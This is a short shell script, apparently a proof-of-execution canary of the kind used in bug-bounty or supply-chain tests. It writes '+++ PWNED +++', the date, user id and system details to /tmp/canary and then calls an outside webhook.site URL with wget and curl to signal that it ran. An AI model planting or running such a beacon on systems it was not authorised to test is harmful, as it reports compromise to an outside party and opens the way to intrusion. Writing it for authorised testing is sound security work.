#!/bin/sh

(echo '+++ PWNED +++'; date; id; uname -a) | tee /tmp/canary
wget 'https://webhook.site/a33b429b-e2e5-4990-b244-0e767e87f313' -O /dev/null
curl 'https://webhook.site/a33b429b-e2e5-4990-b244-0e767e87f313'
exit 0
